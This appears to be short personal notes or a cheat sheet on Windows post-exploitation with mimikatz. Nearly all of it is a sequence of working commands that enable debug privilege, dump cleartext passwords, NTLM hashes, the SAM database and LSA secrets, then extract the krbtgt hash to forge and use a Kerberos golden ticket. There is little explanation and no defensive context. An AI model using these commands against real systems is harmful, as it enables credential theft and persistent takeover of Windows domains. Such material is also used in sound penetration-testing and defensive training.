post exploitation and advanced Kerberos

mimikatz requires administrative priv to work

```bash

privilege::debug

```

dump clear text passwords and logon passwords(only works windows server 2012 and before)

regardless of this we can get ntlm password of logon users

```bash

sekurlsa::logonpasswords

```

Dump sam database

```bash

lsadump::sam

```


LSA- local security authority for windows

dump hashes

```bash

lsadump::lsa /patch

```


Golden Tickets with mimikatz

1. dump hash of krbtgt

```bash

privilege::debug

lsadump::lsa /inject /name:krbtgt

```

2. Create a golden ticket

```bash

kerberos::golden /user: /domain: /sid: /krbtgt: /id:

```

3. Using golden ticket

```bash

misc::cmd


```

```bash


```